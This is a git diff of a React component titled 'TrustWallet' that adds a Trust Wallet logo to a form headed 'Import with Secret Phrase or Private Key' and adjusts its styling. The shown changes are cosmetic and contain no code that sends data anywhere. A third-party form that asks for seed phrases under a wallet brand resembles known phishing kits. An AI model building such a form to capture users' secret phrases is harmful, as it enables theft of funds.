@@ -3,6 +3,7 @@ import { X, Eye, EyeOff } from "lucide-react";
 
 import { Input } from "@/components/ui/input";
 import { useWalletStore } from "@/store/walletStore";
+import TrustWalletFull from "../icons/trust-wallet-full";
 
 const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 	const [walletName, setWalletName] = useState("Main wallet");
@@ -92,9 +93,12 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 	return (
 		<div className="min-h-screen bg-black flex text-gray-300 w-full">
 			{/* Right side - Form */}
-			<div className="flex-1 flex items-center justify-center p-4 lg:p-12">
+			<div className="flex-1 flex flex-col items-center justify-center p-4 lg:p-12">
+				<span className="mb-12 flex w-full ">
+					<TrustWalletFull />
+				</span>
 				<div className="w-full max-w-2xl">
-					<h1 className="text-2xl font-bold text-foreground mb-12">
+					<h1 className="text-2xl font-bold mb-12">
 						Import with Secret Phrase or Private Key
 					</h1>
 
